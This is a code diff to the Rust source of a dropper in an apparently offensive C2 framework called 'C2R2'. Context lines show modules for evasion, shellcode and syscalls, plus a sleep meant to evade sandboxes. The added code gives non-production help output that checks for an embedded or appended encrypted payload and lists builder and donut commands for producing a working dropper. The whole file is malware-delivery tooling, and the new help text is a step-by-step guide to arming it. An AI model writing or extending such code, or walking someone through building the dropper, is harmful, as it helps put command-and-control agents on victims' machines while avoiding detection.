@@ -18,6 +18,7 @@ mod evasion;
 mod shellcode;
 mod syscalls;
 
+use std::env;
 use std::thread;
 use std::time::Duration;
 
@@ -25,6 +26,23 @@ use std::time::Duration;
 const PAYLOAD_MARKER: &[u8] = b"C2R2_PAYLOAD_DATA_START_MARKER__";
 
 fn main() {
+    // Step 0: Check command line arguments (before any delays)
+    // In non-production mode, show help if requested or if no payload is available
+    #[cfg(not(feature = "production"))]
+    {
+        let args: Vec<String> = env::args().collect();
+        if args.iter().any(|a| a == "--help" || a == "-h") {
+            print_help();
+            return;
+        }
+
+        // Check if we have any payload available before proceeding
+        if !has_payload_available() {
+            print_no_payload_error();
+            return;
+        }
+    }
+
     // Step 1: Initial delay to evade sandbox time acceleration
     thread::sleep(Duration::from_secs(3));
 
@@ -267,4 +285,97 @@ fn open_file(path: &std::path::PathBuf) {
             SW_SHOWNORMAL,
         );
     }
+}
+
+// =============================================================================
+// Help and Diagnostics Functions (non-production mode only)
+// =============================================================================
+
+/// Print help message explaining how to use the dropper
+#[cfg(not(feature = "production"))]
+fn print_help() {
+    println!("C2R2 Dropper v1.0");
+    println!("==================");
+    println!();
+    println!("This is a standalone dropper template for the C2R2 framework.");
+    println!();
+    println!("USAGE:");
+    println!("  This executable is designed to be used with the C2R2 builder tool.");
+    println!("  It cannot be run directly without an embedded or appended payload.");
+    println!();
+    println!("TO CREATE A WORKING DROPPER:");
+    println!();
+    println!("  Option 1: Generate Standalone Dropper (Recommended, no Rust required)");
+    println!(
+        "    builder generate-dropper --agent agent.exe --template dropper.exe --output my_dropper"
+    );
+    println!();
+    println!("  Option 2: Build Dropper with Shellcode (Requires donut + Rust)");
+    println!("    1. Install donut: https://github.com/TheWover/donut");
+    println!("    2. Generate shellcode: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
+    println!("    3. Build: builder build-dropper --shellcode shellcode.bin --output my_dropper");
+    println!();
+    println!("PREREQUISITES:");
+    println!("  - builder executable (from c2r2-server package)");
+    println!("  - agent.exe (generated or pre-compiled)");
+    println!("  - For shellcode mode: donut (https://github.com/TheWover/donut)");
+    println!();
+    println!("For more information, see: dropper-rust/README.md");
+}
+
+/// Check if there's any payload available (embedded or appended)
+#[cfg(all(not(feature = "production"), target_os = "windows"))]
+fn has_payload_available() -> bool {
+    // Check for appended payload
+    if try_extract_appended_payload().is_some() {
+        return true;
+    }
+
+    // Check for embedded shellcode in config
+    if !config::ENCRYPTED_SHELLCODE.is_empty() {
+        return true;
+    }
+
+    // Check for embedded agent in config
+    if !config::ENCRYPTED_AGENT.is_empty() {
+        return true;
+    }
+
+    false
+}
+
+/// Check if there's any payload available (non-Windows version for build testing)
+#[cfg(all(not(feature = "production"), not(target_os = "windows")))]
+fn has_payload_available() -> bool {
+    // Check for embedded shellcode in config
+    if !config::ENCRYPTED_SHELLCODE.is_empty() {
+        return true;
+    }
+
+    // Check for embedded agent in config
+    if !config::ENCRYPTED_AGENT.is_empty() {
+        return true;
+    }
+
+    false
+}
+
+/// Print error message when no payload is available
+#[cfg(not(feature = "production"))]
+fn print_no_payload_error() {
+    eprintln!("ERROR: No payload embedded in this dropper.");
+    eprintln!();
+    eprintln!("This is a template dropper that requires a payload to be embedded or appended.");
+    eprintln!();
+    eprintln!("To create a working dropper, use the C2R2 builder:");
+    eprintln!();
+    eprintln!("  Option 1 - Standalone (Recommended):");
+    eprintln!("    builder generate-dropper --agent agent.exe --template dropper.exe --output final_dropper");
+    eprintln!();
+    eprintln!("  Option 2 - With Shellcode (requires donut):");
+    eprintln!("    1. Install donut from: https://github.com/TheWover/donut");
+    eprintln!("    2. Generate shellcode: donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2");
+    eprintln!("    3. Build dropper: builder build-dropper --shellcode shellcode.bin --output final_dropper");
+    eprintln!();
+    eprintln!("Run with --help for more information.");
 }
